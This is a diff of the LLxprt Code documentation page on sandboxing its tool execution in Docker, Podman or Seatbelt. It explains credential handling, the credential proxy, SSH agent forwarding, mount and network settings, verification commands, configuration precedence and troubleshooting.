+crossings have been removed:</p>
+<ul>
+<li><strong><code>GEMINI_API_KEY</code> and <code>GOOGLE_API_KEY</code></strong> are no longer forwarded as container
+environment variables, even when set on the host.</li>
+<li><strong><code>~/.config/gcloud</code></strong> is no longer mounted into the container.</li>
+<li><strong>The file named by <code>GOOGLE_APPLICATION_CREDENTIALS</code></strong> is no longer mounted,
+and that variable is no longer set inside the container.</li>
+</ul>
+<p>The Gemini provider itself still works from inside a container sandbox. Only the
+environment-variable and credential-file routes were removed; named API keys are
+unaffected. Save the key once on the host:</p>
+<pre><code>/key save gemini-personal &lt;your-api-key&gt;
+</code></pre>
+<p>Then, from inside the sandbox, either load it interactively:</p>
+<pre><code>/key load gemini-personal
+</code></pre>
+<p>or reference it from a profile with <code>auth-key-name</code>, which resolves it
+automatically at startup. Either way the key is fetched over the
+<a href="#credential-proxy-container-mode-only">credential proxy</a> rather than read from
+the container's environment, and authenticates against the Gemini Developer API.</p>
+<p>Which <code>/key</code> subcommands work where:</p>
+<table>
+<thead>
+<tr>
+<th>Subcommand</th>
+<th>On the host</th>
+<th>Inside a container</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/key load</code></td>
+<td>yes</td>
+<td>yes (read via the proxy)</td>
+</tr>
+<tr>
+<td><code>/key list</code>, <code>/key show</code></td>
+<td>yes</td>
+<td>yes (read via the proxy)</td>
+</tr>
+<tr>
+<td><code>/key save</code></td>
+<td>yes</td>
+<td>no — manage keys on the host</td>
+</tr>
+<tr>
+<td><code>/key delete</code></td>
+<td>yes</td>
+<td>no — manage keys on the host</td>
+</tr>
+</tbody>
+</table>
+<p><code>/key save</code> and <code>/key delete</code> fail inside the container with &quot;API key management
+is not available in sandbox mode&quot;. That is deliberate: the proxy serves key
+reads but refuses writes, so the sandbox cannot alter what is stored on your
+host.</p>
+<p>Vertex AI, application default credentials (ADC), and service-account
+authentication do <strong>not</strong> work from inside a container sandbox. A proxy-resolved
+named key authenticates against the Gemini Developer API, not Vertex AI, because
+Vertex AI requires the <code>vertex-ai</code> auth mode which is not established from a
+proxy-resolved key. This is tracked as issue
+<a href="https://github.com/vybestack/llxprt-code/issues/2959">#2959</a>.</p>
+<blockquote>
+<p><strong>Remaining exposure:</strong> the LLxprt global configuration directory is still
+mounted read-write into the container (see
+<a href="#filesystem">Filesystem</a>). That directory holds your <code>profiles/*.json</code> files
+and a global <code>.env</code>, so a profile containing an inline <code>auth-key</code>, or a
+global <code>.env</code>, is still readable from inside the container. Prefer
+<code>/key save</code> over inline profile keys. This is tracked as issue
+<a href="https://github.com/vybestack/llxprt-code/issues/2957">#2957</a>.</p>
+</blockquote>
+<h2>Intentional boundary crossings</h2>
+<p>The sandbox forwards certain credentials and configuration into the boundary so
+that development workflows (authentication, git operations) continue to work.
+These are intentional design choices that you opted into or that are part of the
+sandbox design, and each carries a risk you should understand before enabling.</p>
+<h3>Credential proxy (container mode only)</h3>
+<p>In Docker or Podman mode, a host-side credential proxy runs over a Unix socket
+(the path is set via the <code>LLXPRT_CREDENTIAL_SOCKET</code> environment variable). This
+is an intentional boundary crossing: it lets the container authenticate with
+your providers without receiving your stored secrets directly.</p>
+<p>What the proxy provides:</p>
+<ul>
+<li><strong>Short-lived access tokens</strong> — the container receives short-lived tokens, not
+your stored refresh tokens. Refresh tokens stay on the host.</li>
+<li><strong>Key reads</strong> — <code>/key load</code>, <code>/key list</code>, <code>/key show</code>, and key resolution for
+providers read host-saved keys through the proxy.</li>
+<li><strong>OAuth flows</strong> — OAuth login opens the browser on the host; the container
+authenticates through the proxy.</li>
+</ul>
+<p>What the proxy blocks:</p>
+<ul>
+<li><strong>Key writes are blocked</strong> — <code>/key save</code> and <code>/key delete</code> throw an error in
+container mode (&quot;API key management is not available in sandbox mode&quot;). Keys
+must be managed on the host.</li>
+<li><strong>Your stored secrets are not mounted</strong> — <code>~/.git-credentials</code> is
+intentionally not mounted into the container, and <code>GEMINI_API_KEY</code>,
+<code>GOOGLE_API_KEY</code>, the gcloud config directory, and the ADC file are not
+forwarded or mounted (see
+<a href="#credential-handling-in-containers">Credential handling in containers</a>). The
+proxy is the intended way for the container to obtain access tokens and
+resolve named API keys. The LLxprt global configuration directory is still
+mounted, however, so a profile containing an inline <code>auth-key</code>, or a global
+<code>.env</code>, remains readable from inside the container (see issue
+<a href="https://github.com/vybestack/llxprt-code/issues/2957">#2957</a>).</li>
+</ul>
+<p>How the container proves it is authorised: a per-session capability token is
+passed to LLxprt Code through an inherited file descriptor, never through
+process arguments, the container environment, or a file mounted where the
+sandbox can read it. Processes that run before the CLI — relays, launchers,
+your <code>sandbox.bashrc</code> — never see it. Reaching the socket is therefore not
+sufficient by itself; a client without the consumed capability is rejected as
+<code>UNAUTHORIZED</code>.</p>
+<blockquote>
+<p><strong>Risk:</strong> A compromised process inside the container that obtains the
+capability token can authenticate as you for the lifetime of the session.
+The transport above narrows how it could be obtained; it does not change the
+fact that this boundary is intentionally crossed to enable authentication.</p>
+</blockquote>
+<p>On Linux, <code>network: off</code> containers still reach the proxy over the mounted
+temp-directory socket. On macOS, the Docker and Podman credential bridges need
+container networking, so <code>network: off</code> fails before the proxy, bridge, or
+container starts — see <a href="#network">Network</a>.</p>
+<blockquote>
+<p><strong>Note:</strong> Seatbelt mode does not use the credential proxy. It runs on your
+host with full access to your keyring and token store.</p>
+</blockquote>
+<h3>SSH agent forwarding</h3>
+<p>When <code>sshAgent</code> is <code>auto</code> or <code>on</code> and <code>SSH_AUTH_SOCK</code> is set on the host, the
+SSH agent socket is forwarded into the container so that <code>git push</code>, <code>git pull</code>,
+and other SSH operations work.</p>
+<ul>
+<li><strong>Docker on Linux:</strong> the socket is mounted directly into the container.</li>
+<li><strong>Docker on macOS:</strong> a TCP-to-Unix-socket bridge is used (Docker Desktop's
+socket is inaccessible to the non-root container user).</li>
+<li><strong>Podman on macOS:</strong> an SSH reverse tunnel is set up (requires <code>socat</code> in the
+container image).</li>
+</ul>
+<blockquote>
+<p><strong>Risk:</strong> A compromised process inside the container can use the forwarded
+SSH agent to authenticate SSH connections as you for the duration of the
+session. Private keys are not copied into the container, but agent forwarding
+grants the ability to sign SSH challenges.</p>
+</blockquote>
+<p>For Podman on macOS, an existing non-host <code>--network</code> setting stays
+authoritative. LLxprt Code warns and skips SSH agent forwarding rather than
+overriding your network policy to make forwarding work.</p>
+<p>When the host agent is reachable but has no identities loaded, LLxprt Code
+prints a warning at startup with remediation guidance. Forwarding still
+proceeds — load a key with <code>ssh-add</code> so git SSH operations succeed inside the
+container.</p>
+<h3>Git config passthrough</h3>
+<p>These files are mounted read-only into the container when they exist on the
+host, so that git identity and known-host configuration work:</p>
+<ul>
+<li><code>~/.gitconfig</code></li>
+<li><code>~/.config/git/config</code></li>
+<li><code>~/.gitignore_global</code></li>
+<li><code>~/.ssh/known_hosts</code></li>
+</ul>
+<p><code>~/.git-credentials</code> is intentionally <strong>not</strong> mounted — credential access goes
+through the proxy, not through a plaintext credentials file.</p>
+<blockquote>
+<p><strong>Risk:</strong> The mounted files are read-only, but their contents (git identity,
+known hosts) are visible to any process in the container.</p>
+</blockquote>
+<h3>Custom mounts and environment variables</h3>
+<p>You can mount arbitrary host paths and forward arbitrary environment variables
+into the container. These are controlled by environment variables:</p>
+<ul>
+<li><strong><code>LLXPRT_SANDBOX_MOUNTS</code></strong> or <strong><code>SANDBOX_MOUNTS</code></strong> — a comma-separated list
+of mount specifications. Each entry is <code>host-path:container-path:mode</code> where
+<code>mode</code> is <code>ro</code> (read-only, the default if omitted) or <code>rw</code> (read-write). If
+the container path is omitted, the host path is used as-is. Each host path
+must be absolute and must exist. Sandbox profiles populate this variable
+from their <code>mounts</code> array.</li>
+<li><strong><code>SANDBOX_ENV</code></strong> — a comma-separated list of <code>key=value</code> pairs that are
+passed into the container as environment variables. Sandbox profiles populate
+this from their <code>env</code> object.</li>
+</ul>
+<blockquote>
+<p><strong>Risk:</strong> Every path you add via these variables is accessible inside the
+container (read-only or read-write, as specified). Every <code>key=value</code> pair you
+add via <code>SANDBOX_ENV</code> is visible to any process inside the container. If you
+mount a directory containing secrets, those secrets are exposed. Audit what
+your profiles and environment variables forward before enabling the sandbox.</p>
+</blockquote>
+<h2>Verifying the sandbox is active</h2>
+<p>Run these commands from <strong>inside</strong> a sandboxed session to confirm the boundary
+is where you expect.</p>
+<h3>Confirm you are inside a container</h3>
+<p>Do <strong>not</strong> rely on the <code>SANDBOX</code> environment variable. LLxprt Code sets
+<code>SANDBOX</code> inside the sandboxed process to mark that it has already started one
+layer of containment, and a pre-existing <code>SANDBOX</code> value on your host causes
+sandbox startup to be skipped. That means the variable reports &quot;sandboxed&quot; on
+an unsandboxed host and is trivially forgeable — it cannot distinguish
+sandboxed from unsandboxed execution.</p>
+<p>Instead, check for an observable property of the container environment that a
+host process does not have:</p>
+<pre><code class="language-bash"># /.dockerenv exists only inside Docker containers
+test -f /.dockerenv &amp;&amp; echo &quot;inside a Docker container&quot; || echo &quot;not a Docker container&quot;
+
+# /run/.containerenv exists only inside Podman containers
+test -f /run/.containerenv &amp;&amp; echo &quot;inside a Podman container&quot; || echo &quot;not a Podman container&quot;
+</code></pre>
+<p>For Seatbelt, there is no equivalent filesystem marker — <code>sandbox-exec</code> applies
+kernel restrictions to a process running directly on your host. To confirm
+Seatbelt is active, check that the process is running under <code>sandbox-exec</code>:</p>
+<pre><code class="language-bash"># Shows sandbox-exec as the parent if Seatbelt is active (macOS only)
+ps -o comm= -p $PPID 2&gt;/dev/null
+</code></pre>
+<blockquote>
+<p><strong>Limitation:</strong> These checks confirm the execution environment, not the
+specific mount or network policy in effect. The <code>/.dockerenv</code> and
+<code>/run/.containerenv</code> markers prove you are inside a container runtime, but
+they do not tell you which paths are mounted or whether network access is
+enabled — verify those separately with the checks below.</p>
+</blockquote>
+<h3>Confirm the engine</h3>
+<pre><code class="language-bash"># Inside the container, check which runtime is in use
+# (container mode only)
+cat /proc/1/cgroup 2&gt;/dev/null | head -5
+</code></pre>
+<p>Or verify from outside, before starting the session, that the engine binary
+exists:</p>
+<pre><code class="language-bash">which docker || which podman || which sandbox-exec
+</code></pre>
+<h3>Confirm filesystem isolation</h3>
+<pre><code class="language-bash"># This should succeed (project directory is read-write)
+touch ./sandbox-test-file &amp;&amp; rm ./sandbox-test-file &amp;&amp; echo &quot;project: writable&quot;
+
+# This should fail inside a container (home directory is not mounted)
+# Replace ~ with an absolute path to a file outside your project
+test -r ~/.ssh/id_ed25519 &amp;&amp; echo &quot;WARNING: private key readable&quot; || echo &quot;private key not accessible&quot;
+</code></pre>
+<h3>Confirm network isolation (container mode)</h3>
+<p>With a <code>network: off</code> profile, outbound connections should fail:</p>
+<pre><code class="language-bash"># Inside a network-off container, this should fail or hang
+curl --connect-timeout 5 https://example.com || echo &quot;network is blocked&quot;
+</code></pre>
+<h3>Confirm credential socket (container mode)</h3>
+<pre><code class="language-bash"># The credential socket path should be set in the environment
+echo &quot;$LLXPRT_CREDENTIAL_SOCKET&quot;
+</code></pre>
+<h2>Choosing an engine</h2>
+<p><strong>Prefer Docker or Podman.</strong> Both run tool execution inside an isolated Linux
+container, which gives you a separate process namespace, enforceable resource
+limits, and a credential proxy that keeps your stored secrets on the host.</p>
+<p><strong>Use Seatbelt only when containers are unavailable.</strong> Seatbelt is a macOS-only
+fallback with a substantially weaker boundary: it provides no process isolation
+(the sandboxed process runs directly on your host), no resource limits (CPU,
+memory, and process count cannot be capped), and no credential isolation (the
+process runs against your full keyring and token store). Its only effective
+control is a write-path allow-list, backed by Apple's <code>sandbox-exec</code>, which is
+undocumented and informally deprecated since macOS 10.15.</p>
 <table>
 <thead>
 <tr>
 <th>Engine</th>
-<th>Best for</th>
-<th>Notes</th>
+<th>Platform</th>
+<th>Resource limits</th>
+<th>Credential proxy</th>
+<th>Network control</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td><strong>Docker</strong></td>
-<td>Most users on macOS/Linux</td>
-<td>Best tested, auto-detected first</td>
+<td>macOS, Linux</td>
+<td>Yes</td>
+<td>Yes</td>
+<td>Yes (network namespace)</td>
 </tr>
 <tr>
 <td><strong>Podman</strong></td>
-<td>Rootless containers, Linux</td>
-<td>Full support; macOS needs extra setup for SSH/credential tunneling and VM memory sizing</td>
+<td>macOS, Linux</td>
+<td>Yes</td>
+<td>Yes</td>
+<td>Yes (network namespace)</td>
 </tr>
 <tr>
 <td><strong>Seatbelt</strong></td>
-<td>Lightweight macOS fallback</td>
-<td>Uses <code>sandbox-exec</code>. No resource limits, no credential isolation. Discouraged for serious use.</td>
+<td>macOS only</td>
+<td>No</td>
+<td>No</td>
+<td>Yes (via macOS profile file)</td>
 </tr>
 </tbody>
 </table>
-<p>Engine auto-detection order: Docker → Podman → Seatbelt (macOS only).</p>
-<h3>Why Not Seatbelt?</h3>
-<p>Seatbelt (<code>sandbox-exec</code>) runs directly on the host with macOS kernel restrictions. It restricts file system access but:</p>
-<ul>
-<li><strong>No resource limits</strong> — can't cap CPU, memory, or process count</li>
-<li><strong>No credential isolation</strong> — runs with your full keyring and token store</li>
-<li><strong>No network isolation</strong> — <code>network: off</code> is not enforced</li>
-<li><strong>Deprecated by Apple</strong> — <code>sandbox-exec</code> has been informally deprecated since macOS 10.15</li>
-</ul>
-<p>Use Docker or Podman if at all possible. Seatbelt is a last resort.</p>
-<h2>Configuring Sandboxing</h2>
-<h3>CLI Flags</h3>
+<p>When <code>--sandbox</code> is used without an explicit engine, LLxprt Code auto-detects an
+available runtime. When <code>LLXPRT_SANDBOX=true</code> is set in the environment and no
+engine is specified, the detection order on macOS is Seatbelt, then Docker, then
+Podman; on Linux it is Docker, then Podman. If you are on macOS and want the
+stronger container boundary, set <code>--sandbox-engine docker</code> (or <code>podman</code>)
+explicitly rather than relying on auto-detection, which prefers Seatbelt.</p>
+<h2>Configuring sandboxing</h2>
+<h3>CLI flags</h3>
 <pre><code class="language-bash">llxprt --sandbox                              # Enable with auto-detected engine
 llxprt --sandbox-engine docker                # Force Docker
 llxprt --sandbox-engine podman                # Force Podman
 llxprt --sandbox-engine sandbox-exec          # Force Seatbelt (macOS only)
 llxprt --sandbox-engine none                  # Explicitly disable
-llxprt --sandbox-profile-load &lt;name&gt;          # Load a profile (implies sandbox)
+llxprt --sandbox-profile-load &lt;name&gt;          # Load a profile
 </code></pre>
-<h3>Environment Variable</h3>
-<pre><code class="language-bash">export LLXPRT_SANDBOX=true                    # Enable sandbox
-export LLXPRT_SANDBOX=docker                  # Force engine
+<p><code>--sandbox-engine</code> accepts: <code>auto</code>, <code>docker</code>, <code>podman</code>, <code>sandbox-exec</code>, <code>none</code>.</p>
+<h3>Environment variable</h3>
+<pre><code class="language-bash">export LLXPRT_SANDBOX=true                    # Enable sandbox (auto-detect engine)
+export LLXPRT_SANDBOX=docker                  # Enable and force a specific engine
 export LLXPRT_SANDBOX=false                   # Disable
 </code></pre>
+<p><code>LLXPRT_SANDBOX</code> accepts a boolean (<code>true</code>/<code>false</code>/<code>1</code>/<code>0</code>) or an engine name
+(<code>docker</code>, <code>podman</code>, <code>sandbox-exec</code>). When set to <code>true</code>, LLxprt Code
+auto-detects an available engine.</p>
 <p><code>--sandbox-engine none</code> always wins, even when <code>LLXPRT_SANDBOX</code> is set.</p>
-<h2>Sandbox Profiles</h2>
-<p>Profiles are JSON files in <code>&lt;config&gt;/sandboxes/</code> (see <a href="./reference/application-directories.html">Application Directories</a>). They control engine, image, resources, networking, SSH agent, and extra mounts. Default profiles are created automatically the first time you use <code>--sandbox-profile-load</code>.</p>
-<h3>Built-in Profiles</h3>
+<h3>Precedence</h3>
+<p>When more than one source configures sandboxing, they are applied in this order
+(highest to lowest):</p>
+<ol>
+<li><strong>CLI flag</strong> — <code>--sandbox</code> / <code>--no-sandbox</code></li>
+<li><strong>Environment variable</strong> — <code>LLXPRT_SANDBOX</code></li>
+<li><strong>Settings file</strong> — <code>settings.sandbox</code></li>
+<li><strong>Default</strong> — no sandbox</li>
+</ol>
+<p>An explicit flag wins over a set <code>LLXPRT_SANDBOX</code>. In particular, <code>--no-sandbox</code>
+(or <code>--sandbox false</code>) disables the sandbox even when <code>LLXPRT_SANDBOX=true</code> (or
+<code>docker</code>, <code>1</code>) is set, so you can always opt out of an inherited environment
+variable. When the flag is absent, <code>LLXPRT_SANDBOX</code> is honoured; when both the
+flag and the variable are absent, <code>settings.sandbox</code> is used. An empty or
+whitespace-only <code>LLXPRT_SANDBOX</code> is treated as absent.</p>
+<p><code>--sandbox-engine none</code> still short-circuits to no sandbox regardless of the
+flag, variable, or settings.</p>
+<h3>Sandbox profiles</h3>
+<p>Profiles are JSON files in your config directory under <code>sandboxes/</code> (see
+<a href="./reference/application-directories.html">Application Directories</a>). They control
+engine, image, resources, networking, SSH agent, and extra mounts. Default
+profiles are created automatically the first time you use
+<code>--sandbox-profile-load</code>.</p>
+<h4>Built-in profiles</h4>
 <table>
 <thead>
 <tr>
@@ -196,7 +993,7 @@ export LLXPRT_SANDBOX=false                   # Disable
 </tr>
 </tbody>
 </table>
-<h3>Profile Format</h3>
+<h4>Profile format</h4>
 <pre><code class="language-json">{
   &quot;engine&quot;: &quot;auto&quot;,
   &quot;image&quot;: &quot;ghcr.io/vybestack/llxprt-code/sandbox:0.9.0&quot;,
@@ -215,7 +1012,7 @@ export LLXPRT_SANDBOX=false                   # Disable
 <thead>
 <tr>
 <th>Field</th>
-<th>Values</th>
+<th>Valid values</th>
 <th>Description</th>
 </tr>
 </thead>
@@ -228,7 +1025,7 @@ export LLXPRT_SANDBOX=false                   # Disable
 <tr>
 <td><code>image</code></td>
 <td>string</td>
-<td>Container image (defaults to release image)</td>
+<td>Container image (defaults to the release image)</td>
 </tr>
 <tr>
 <td><code>resources.cpus</code></td>
@@ -247,8 +1044,8 @@ export LLXPRT_SANDBOX=false                   # Disable
 </tr>
 <tr>
 <td><code>network</code></td>
-<td><code>on</code>, <code>off</code></td>
-<td>Container networking (<code>off</code> = <code>--network none</code>)</td>
+<td><code>on</code>, <code>off</code>, <code>proxied</code></td>
+<td>Sandbox network policy (see <a href="#network">Network</a>)</td>
 </tr>
 <tr>
 <td><code>sshAgent</code></td>
@@ -267,13 +1064,14 @@ export LLXPRT_SANDBOX=false                   # Disable
 </tr>
 </tbody>
 </table>
-<h3>Creating Custom Profiles</h3>
-<p>Create a JSON file in <code>&lt;config&gt;/sandboxes/</code> (see <a href="./reference/application-directories.html">Application Directories</a>):</p>
-<pre><code class="language-bash"># SANDBOX_DIR=&lt;config&gt;/sandboxes — set this to your sandbox profiles directory.
-# The config dir resolves via the canonical resolver (LLXPRT_CONFIG_HOME, then
-# the platform default), consistent with sandbox-profiles docs.
-SANDBOX_DIR=&quot;${LLXPRT_CONFIG_HOME:-$(node --input-type=module -e &quot;import envPaths from 'env-paths'; process.stdout.write(envPaths('llxprt-code',{suffix:''}).config)&quot;)}/sandboxes&quot;
-cat &gt; &quot;$SANDBOX_DIR/beefy.json&quot; &lt;&lt; 'EOF'
+<blockquote>
+<p><strong>Note:</strong> <code>network: proxied</code> requires <code>LLXPRT_SANDBOX_PROXY_COMMAND</code>. Without
+it, startup fails rather than silently using open networking.</p>
+</blockquote>
+<h4>Creating a custom profile</h4>
+<p>Create a JSON file in your <code>sandboxes/</code> directory (see
+<a href="./reference/application-directories.html">Application Directories</a>):</p>
+<pre><code class="language-bash">cat &gt; &quot;&lt;config&gt;/sandboxes/beefy.json&quot; &lt;&lt; 'EOF'
 {
   &quot;engine&quot;: &quot;docker&quot;,
   &quot;resources&quot;: { &quot;cpus&quot;: 4, &quot;memory&quot;: &quot;8g&quot;, &quot;pids&quot;: 512 },
@@ -284,66 +1082,117 @@ EOF
 
 llxprt --sandbox-profile-load beefy &quot;run the full test suite&quot;
 </code></pre>
-<h2>Credential Proxy (Container Mode)</h2>
-<p>In Docker/Podman mode, a host-side credential proxy runs over a Unix socket. The container never sees your stored secrets:</p>
-<ul>
-<li><strong>Refresh tokens stay on the host</strong> — the container only receives short-lived access tokens</li>
-<li><strong>OAuth works from inside the sandbox</strong> — <code>/auth &lt;provider&gt; login</code> opens the browser on the host</li>
-<li><strong>Key reads work</strong> — <code>/key load</code>, <code>/key list</code>, and <code>/key show</code> read host-saved keys via the proxy</li>
-<li><strong>Key writes are blocked</strong> — <code>/key save</code> and <code>/key delete</code> throw an error in container mode (keys must be managed on the host)</li>
-<li><strong>PATs and API keys never enter the container</strong> — the proxy injects authorization headers without exposing the underlying credential</li>
-</ul>
-<p>The socket path is set automatically via <code>LLXPRT_CREDENTIAL_SOCKET</code>.</p>
-<blockquote>
-<p><strong>Note:</strong> Seatbelt mode runs on the host directly, so there is no credential proxy — it uses your normal keyring and token store.</p>
-</blockquote>
-<h2>SSH Agent Forwarding</h2>
-<p>When <code>sshAgent</code> is <code>auto</code> or <code>on</code> and <code>SSH_AUTH_SOCK</code> is set on the host:</p>
-<ul>
-<li><strong>Docker on Linux:</strong> the socket is mounted directly into the container</li>
-<li><strong>Docker on macOS:</strong> the socket is mounted directly (Docker Desktop handles forwarding)</li>
-<li><strong>Podman on macOS:</strong> LLxprt sets up an SSH tunnel bridge (requires <code>socat</code> in the container image and <code>--network=host</code>)</li>
-</ul>
-<h3>Podman macOS SSH Workaround</h3>
-<p>Podman on macOS runs in a VM, so direct socket mounting doesn't work. LLxprt creates an SSH reverse tunnel, but the default macOS launchd socket paths can be problematic. For reliable SSH agent forwarding:</p>
-<pre><code class="language-bash">ssh-agent -a ~/.llxprt/ssh-agent.sock
-export SSH_AUTH_SOCK=~/.llxprt/ssh-agent.sock
-ssh-add ~/.ssh/id_ed25519
-llxprt --sandbox-engine podman --sandbox-profile-load dev
-</code></pre>
-<h2>Git Config in Containers</h2>
-<p>These files are mounted read-only when they exist on the host:</p>
-<ul>
-<li><code>~/.gitconfig</code></li>
-<li><code>~/.config/git/config</code></li>
-<li><code>~/.gitignore_global</code></li>
-<li><code>~/.ssh/known_hosts</code></li>
-</ul>
-<p><code>~/.git-credentials</code> is intentionally <strong>not</strong> mounted — credential access goes through the proxy.</p>
+<p>Replace <code>&lt;config&gt;</code> with your config directory path (see
+<a href="./reference/application-directories.html">Application Directories</a>).</p>
 <h2>Advanced</h2>
-<h3>Extra Container Flags</h3>
+<h3>Extra container flags</h3>
+<p>Pass additional flags to the container runtime:</p>
 <pre><code class="language-bash">export SANDBOX_FLAGS=&quot;--security-opt label=disable&quot;
 </code></pre>
-<h3>UID/GID Mapping (Linux)</h3>
+<p><code>SANDBOX_FLAGS</code> are applied <strong>after</strong> the default hardening flags
+(<code>--cap-drop=ALL</code> and <code>--security-opt no-new-privileges</code>) and survive into the
+container argv, so they can extend or override the defaults:</p>
+<pre><code class="language-bash"># Applied after --cap-drop=ALL, so it appears later in the argv
+export SANDBOX_FLAGS=&quot;--cap-add=NET_ADMIN&quot;
+</code></pre>
+<blockquote>
+<p><strong>Warning — <code>--cap-add</code> only widens the bounding set.</strong> On Docker the image's
+non-root user receives an added capability only in the <strong>bounding</strong> set (the
+permitted/effective/ambient sets stay empty), and on the current-user path
+<code>su</code> clears effective/permitted/ambient capabilities on both runtimes. So
+<code>--cap-add</code> alone does <strong>not</strong> guarantee the final process actually holds the
+capability — that depends on the runtime and on whether the current-user <code>su</code>
+path is in use. The defaults drop all capabilities on purpose; only widen them
+when you understand the exposure, and remove <code>SANDBOX_FLAGS</code> afterward so the
+hardened default is restored. If a workflow genuinely needs elevated
+privileges, <code>--security-opt no-new-privileges=false</code> and <code>--privileged</code> exist
+as explicit, security-reducing escape hatches.</p>
+</blockquote>
+<blockquote>
+<p><strong>Warning — <code>label=disable</code> turns off SELinux labelling.</strong> The flag
+<code>--security-opt label=disable</code> removes the SELinux process label (MCS/MLS
+category) from the container, eliminating a mandatory-access-control boundary
+that confines what the container process can access. Treat it as a
+<strong>last-resort</strong> diagnostic step for SELinux permission denials, not a
+standing setting. After you identify and fix the underlying cause, remove
+<code>SANDBOX_FLAGS</code> so label enforcement is restored.</p>
+</blockquote>
+<h3>UID/GID mapping (Linux)</h3>
+<p>By default on Debian and Ubuntu-based Linux, the container runs as your current
+user UID/GID. To force this behavior on other distributions:</p>
 <pre><code class="language-bash">export SANDBOX_SET_UID_GID=true
 </code></pre>
-<h3>Override Sandbox Image</h3>
+<h3>Override the sandbox image</h3>
 <pre><code class="language-bash">export LLXPRT_SANDBOX_IMAGE=my-registry/my-sandbox:latest
 </code></pre>
 <h2>Troubleshooting</h2>
-<p><strong>Container not starting</strong> — verify Docker or Podman is running: <code>docker info</code> or <code>podman info</code>.</p>
-<p><strong>Permission errors on mounted files</strong> — on Linux, try <code>SANDBOX_SET_UID_GID=true</code> or <code>SANDBOX_FLAGS=&quot;--security-opt label=disable&quot;</code> for SELinux systems.</p>
-<p><strong>SSH not working in Podman on macOS</strong> — use a stable socket path (see Podman macOS SSH Workaround above). The default launchd socket paths are unreliable.</p>
-<p><strong>&quot;socat not found&quot; error</strong> — the sandbox container image needs <code>socat</code> for SSH agent and credential proxy tunneling. Use the official sandbox image.</p>
-<p><strong>Network access denied</strong> — check your profile's <code>network</code> setting. <code>off</code> means <code>--network none</code>.</p>
+<p><strong>Container not starting</strong> — verify Docker or Podman is running: <code>docker info</code>
+or <code>podman info</code>.</p>
+<p><strong>Permission errors on mounted files</strong> — on Linux, try <code>SANDBOX_SET_UID_GID=true</code>
+first. The flag <code>--security-opt label=disable</code> (via <code>SANDBOX_FLAGS</code>) is a
+<strong>last resort</strong> for SELinux systems: it turns off SELinux process labelling for
+the container, removing a mandatory-access-control boundary. Use it only to
+diagnose a SELinux denial, then remove it so label enforcement is restored.</p>
+<p><strong>SSH not working in Podman on macOS</strong> — use a stable socket path. The default
+launchd socket paths are unreliable. Set up a dedicated socket under a
+non-legacy location (such as <code>~/.ssh/</code> or <code>$XDG_RUNTIME_DIR</code>):</p>
+<pre><code class="language-bash">ssh-agent -a ~/.ssh/ssh-agent.sock
+export SSH_AUTH_SOCK=~/.ssh/ssh-agent.sock
+ssh-add ~/.ssh/id_ed25519
+llxprt --sandbox-engine podman --sandbox-profile-load dev
+</code></pre>
+<p><strong>SSH agent forwarded but git auth still fails</strong> — the host agent may be running
+with no identities loaded. Check with <code>ssh-add -l</code>; if it reports an empty
+agent, load a key:</p>
+<pre><code class="language-bash">ssh-add ~/.ssh/id_ed25519
+</code></pre>
+<p>LLxprt Code prints a startup warning when it detects this empty-agent state.
+The warning now also appears in the TUI startup-warnings box (and on stderr
+for text-mode non-interactive runs) instead of only on host stderr.</p>
+<p><strong>&quot;socat not found&quot; error</strong> — the sandbox container image needs <code>socat</code> for SSH
+agent and credential proxy tunneling. Use the official sandbox image.</p>
+<p><strong>Network access denied</strong> — check your profile's <code>network</code> setting. In container
+mode <code>off</code> means <code>--network none</code>; under Seatbelt it selects the closed macOS
+profile.</p>
+<p><strong>&quot;requires a non-empty LLXPRT_SANDBOX_PROXY_COMMAND&quot;</strong> — you set
+<code>network: proxied</code> without supplying a proxy command. Set
+<code>LLXPRT_SANDBOX_PROXY_COMMAND</code>, or change the profile to <code>on</code> or <code>off</code>.</p>
+<p><strong>&quot;macOS credential bridge requires container networking&quot;</strong> — you combined
+<code>network: off</code> with Docker or Podman on macOS. The credential bridge needs
+networking there. Use <code>network: on</code>, switch to Seatbelt, or run on Linux.</p>
+<p><strong>&quot;Sandbox dependency preflight failed&quot;</strong>: the host <code>node_modules</code> of your
+project contains a file the preflight recognized as a binary built for another
+platform (ELF, Mach-O, including universal/fat binaries, or PE where the
+format does not match your host), or a <code>node_modules/.bin</code> symlink pointing at
+the image-global bun location (<code>/usr/local/bun/bin/...</code>, such as <code>bun</code> or
+<code>bunx</code>) while no such path exists on your host. Because the sandbox replaces
+those trees with fresh private per-run mounts anyway, the launch stops before
+the container starts rather than failing later inside it. Remove the affected
+project-local <code>node_modules</code> directory named in the message, reinstall on the
+host, and retry. Files the preflight cannot positively identify (scripts,
+unknown or truncated bytes, matching-host binaries, <code>prebuilds/</code> trees for
+other platforms), and <code>.bin</code> links to absolute paths outside the image-global
+bun location, do not trigger this error.</p>
 <h3>Podman macOS: OOM-killed with exit code 137</h3>
-<p>On macOS, Podman runs containers inside a Linux VM. There are three separate memory limits, and all three must be sized correctly:</p>
+<p>On macOS, Podman runs containers inside a Linux VM. There are three separate
+memory limits, and all three must be sized correctly:</p>
 <ol>
-<li><strong>Podman machine VM memory</strong> — the total memory allocated to the Podman VM. This is the hard ceiling for everything running inside the VM.</li>
-<li><strong>Container memory limit</strong> (<code>--memory</code> / <code>resources.memory</code> in a sandbox profile) — the per-container cgroup limit passed to the container runtime. You can set this higher than the VM memory, but the process will be OOM-killed when the VM runs out of memory first.</li>
-<li><strong>Node.js heap limit</strong> (<code>--max-old-space-size</code>) — automatically derived from the container memory limit when <code>ui.autoConfigureMaxOldSpaceSize</code> is enabled (the default).</li>
+<li><strong>Podman machine VM memory</strong> — the total memory allocated to the Podman VM.
+This is the hard ceiling for everything running inside the VM.</li>
+<li><strong>Container memory limit</strong> (<code>resources.memory</code> in a sandbox profile) — the
+per-container limit passed to the container runtime. You can set this higher
+than the VM memory, but the process will be OOM-killed when the VM runs out
+of memory first.</li>
+<li><strong>Node.js heap limit</strong> (<code>--max-old-space-size</code>) — derived from
+the container memory limit when <code>ui.autoConfigureMaxOldSpaceSize</code> is enabled
+(the default). This applies only when the sandbox CLI runs under Node.js;
+under Bun, <code>--max-old-space-size</code> is not set because Bun does not honour the
+V8 flag.</li>
 </ol>
-<p>If you set the container memory higher than the Podman VM memory, the container starts but the process gets OOM-killed (exit code 137) as soon as it tries to use more memory than the VM has available. LLxprt container flags do <strong>not</strong> resize the Podman machine VM.</p>
